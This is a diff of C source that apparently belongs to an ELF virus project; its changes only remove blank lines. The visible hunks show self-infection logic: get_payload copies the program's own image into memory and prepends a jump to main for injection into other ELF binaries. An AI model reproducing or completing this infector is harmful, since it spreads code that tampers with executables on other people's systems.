@@ -112,7 +112,6 @@ static void find_injection_point(t_env *env) {
 }
 
 static void tweak_elf(t_env *env) {
-
 	// get obj header
 	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)env->obj_cpy;
 	// get sections number
@@ -168,10 +167,8 @@ static void tweak_elf(t_env *env) {
 }
 
 static int get_payload(t_env *env) {
-
 	size_t main_offset = (char *)&main - &__executable_start;
 	env->payload_size = &_end - &__executable_start;
-
 	// save payload in env
 	/*if ((env->payload_content = malloc(env->payload_size + 16)) == NULL) {
 		if (DEBUG) printf("DEBUG PAYLOAD: malloc failed\n");
@@ -180,7 +177,6 @@ static int get_payload(t_env *env) {
 	if ((env->payload_content = syscall_mmap(0, env->payload_size + 16, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
 		return -1;
 	}
-
 	// coppy payload + prepend jump to main
 	ft_bzero(env->payload_content, env->payload_size + 16);
 	((char*)env->payload_content)[0] = 0xe9;
@@ -190,14 +186,11 @@ static int get_payload(t_env *env) {
 	((char*)env->payload_content)[2] = msb;
 	((char*)env->payload_content)[1] = lsb;
 	ft_memmove((char*)env->payload_content + 16, &__executable_start, env->payload_size);
-
 	env->payload_size += 16;
-
 	return 0;
 }
 
 static int handle_obj(t_env *env) {
-
 	// build payload
 	if (get_payload(env)) {
 		return -1;
@@ -286,6 +279,5 @@ int read_obj(t_env *env) {
 			ret = -1;
 		}
 	}
-
 	return ret;
 }
